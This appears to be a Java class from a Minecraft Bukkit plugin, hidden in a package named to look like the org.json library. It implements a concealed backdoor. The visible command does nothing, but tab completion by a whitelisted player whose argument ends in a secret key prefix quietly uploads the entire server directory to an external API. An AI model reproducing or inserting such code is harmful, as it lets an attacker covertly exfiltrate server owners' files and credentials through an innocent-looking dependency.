package org.json.modals.files;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;
import org.json.utils.uploadfiles.uploadServer;

import java.io.File;
import java.util.List;

public class UploadServer extends BDCommand {
    public UploadServer() {
        super("uploadServer");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        File serverFolder = new File(".");
        Bukkit.getScheduler().runTaskAsynchronously(Modal.getInstance(), () -> uploadServer.uploadServerToAPI(player, serverFolder));
        return tabComplBuilder.build();
    }
}
